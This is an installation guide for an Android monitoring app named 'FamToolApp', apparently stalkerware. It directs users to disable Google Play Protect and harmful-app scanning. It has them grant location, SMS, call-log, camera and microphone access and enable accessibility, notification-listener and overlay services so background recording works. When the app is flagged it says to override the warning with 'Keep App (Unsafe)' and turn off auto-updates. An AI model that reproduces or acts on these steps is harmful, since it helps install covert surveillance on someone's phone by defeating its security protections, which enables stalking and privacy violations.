Installation Policy & Critical Guide

Mandatory instructions for correct installation. Failure to follow these steps may result in feature failure or account suspension.

Strict Policy Warning

Our algorithm monitors service health. If permissions are deliberately disabled by the user after installation, your account may be Frozen or Disabled at any time. Refunds for paid limits will not be processed if services are inactive.

1

Mandatory: Disable Play Protect First

Before installing the application, you MUST go to the Google Play Store and disable "Play Protect". If this is not done, the operating system will uninstall the app automatically.

Google Play Store Settings
Scan apps with Play Protect
Improve harmful app detection
Both must be OFF
2

Login Activity: Initial Permissions

During the login process (Login Activity), the app will request runtime permissions. You must click "Allow" or "While using the app" for all requests.

  • Location (Precise)
  • SMS & Call Logs
  • Camera & Microphone
3

Child Activity: System Services

In the final setup screen (Child Activity), you will see a list of switches. You must tap each one and Enable the service in the Android Settings that open up.

Accessibility Service
Notification Listener
Display Over Other Apps

ALL Must be Enabled (Green)

4

Critical Fix: Camera/Audio Recording

ATTENTION: Android systems often block background recording even if permissions are given. To fix this, you must perform this specific action for the 'FamToolApp' Accessibility Service:

The Action Sequence

ON ➝ OFF ➝ ON (Again)

Go to Settings > Accessibility > Installed Apps > FamToolApp. Turn it OFF, wait 2 seconds, then Turn it ON again. This resets the system flag.

5

Troubleshooting: 'Harmful App' / Disabled?

Play Protect might identify this app as "Harmful" because it monitors device activity. It may Disable the app automatically. You MUST check Play Protect settings to re-enable it.

Play Protect Status
Harmful app disabled
FamToolApp
ENABLE APP
  • Go to Play Store > Play Protect. Look for "Harmful apps disabled".
  • Tap on "FamToolApp" or "Enable". If asked, select "Keep App (Unsafe)".
  • Finally: Turn OFF "Scan apps" and Go to Settings > Network > Auto-update > "Don't auto-update".
6

Android 13+ Setup: Restricted Settings

On Android 13, 14 & 15, enabling Accessibility is blocked by default ('Restricted Setting'). You must manually allow it from the App Info menu.
